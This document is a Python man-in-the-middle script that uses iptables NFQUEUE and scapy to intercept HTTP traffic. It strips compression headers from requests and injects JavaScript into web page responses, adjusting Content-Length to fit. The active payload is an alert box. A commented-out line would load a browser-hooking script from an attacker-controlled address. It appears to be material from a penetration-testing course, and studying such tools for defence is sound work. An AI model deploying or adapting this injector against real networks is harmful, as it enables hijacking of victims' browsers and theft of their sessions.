import netfilterqueue
from re import sub, search
from scapy.layers.inet import IP, TCP
from scapy.all import Raw
from subprocess import run

#apt-get install python-netfilterqueue
#pip install Cython --install-option="--no-cython-compile"
#apt-get install build-essential python-dev libnetfilter-queue-dev
#iptables -I FORWARD -j NFQUEUE --queue-num 0
#iptables -I OUTPUT -j NFQUEUE --queue-num 0
#iptables -I INPUT -j NFQUEUE --queue-num 0
#iptables --flush

def set_load(packet, load):
    packet[Raw].load = load
    del packet[IP].len
    del packet[IP].chksum
    del packet[TCP].chksum
    return packet

def process_packet(packet):
    # run("iptables --flush", shell=True)
    scapy_packet = IP(packet.get_payload())
    if scapy_packet.haslayer(Raw):
        load = scapy_packet[Raw].load
        if scapy_packet.haslayer(TCP):
            if scapy_packet[TCP].dport == 80:
                print(" [+] HTTP Request")
                # print(scapy_packet.show())
                load = sub(b"Accept-Encoding:.*?\\r\\n", b"", load)
                load = load.replace(b"HTTP/1.1", b"HTTP/1.0")
            elif scapy_packet[TCP].sport == 80:
                print (" [+] HTTP Response")
                #injection_code = '<script src="http://10.0.2.5:3000/hook.js"></script>'
                injection_code = "<script>alert('1');</script></body>"
                load = load.replace(b"</body>", bytes(injection_code, "utf-8"))
                # load = load.replace(b"</body>", bytes(injection_code + "</body>", "utf-8"))
                content_length_search = search("(?:Content-Length:\s)(\d*)", str(load))
                try:
                    print(str(content_length_search.group(1)))
                except AttributeError:
                    pass
                if content_length_search and "text/html" in str(load):
                    content_length = int(content_length_search.group(1))
                    new_content_length = content_length + len(injection_code) - len("</body>")
                    #print(str(load))
                    load = load.replace(bytes(str(content_length), "utf-8"), bytes(str(new_content_length), "utf-8"))
                # print(load)

        if load != scapy_packet[Raw].load:
            new_packet = set_load(scapy_packet, load)
            print(new_packet.show())
            packet.set_payload(bytes(new_packet)) #Content-Length:\s\d*
    packet.accept()

port = 80
run("iptables -I FORWARD -j NFQUEUE --queue-num 0", shell=True)
queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()